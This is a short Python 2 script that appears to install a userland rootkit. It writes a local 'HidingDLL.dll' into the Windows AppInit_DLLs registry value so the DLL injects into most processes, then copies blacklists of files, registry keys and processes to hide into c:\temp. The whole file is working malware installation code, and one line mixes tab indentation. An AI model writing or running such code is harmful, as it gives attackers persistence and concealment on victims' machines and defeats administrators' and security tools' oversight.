from _winreg import *
import os
import shutil

DEST_BLACK_LIST_FOLDER = r"c:\temp"
FILES_BLACK_LIST = "files_blackList.txt"
REGISTRY_BLACK_LIST = "registry_blackList.txt"
PROCESS_BLACK_LIST = "process_blackList.txt"

aReg = ConnectRegistry(None,HKEY_LOCAL_MACHINE)
key = OpenKey(aReg, r'Software\Microsoft\Windows NT\CurrentVersion\Windows', 0, KEY_ALL_ACCESS)
#dir_path = os.path.dirname(os.path.realpath(__file__))
dir_path = os.getcwd()
dll_path = os.path.join(dir_path,"HidingDLL.dll")
try:
    SetValueEx(key, "AppInit_DLLs", 0, REG_SZ, dll_path)
    SetValueEx(key, "LoadAppInit_DLLs", 0, REG_DWORD, 1)
except EnvironmentError:
    print "Encountered problems writing into the Registry..."
CloseKey(key)
CloseKey(aReg)

if not os.path.isdir(DEST_BLACK_LIST_FOLDER):
    os.makedirs(DEST_BLACK_LIST_FOLDER)

files_black_list_path = os.path.join(dir_path, FILES_BLACK_LIST)
registry_black_list_path = os.path.join(dir_path, REGISTRY_BLACK_LIST)
process_black_list_path = os.path.join(dir_path, PROCESS_BLACK_LIST)

try:
    shutil.copy(files_black_list_path,DEST_BLACK_LIST_FOLDER)
    shutil.copy(registry_black_list_path,DEST_BLACK_LIST_FOLDER)
	shutil.copy(process_black_list_path, DEST_BLACK_LIST_FOLDER)
except Exception as ex:
    print ex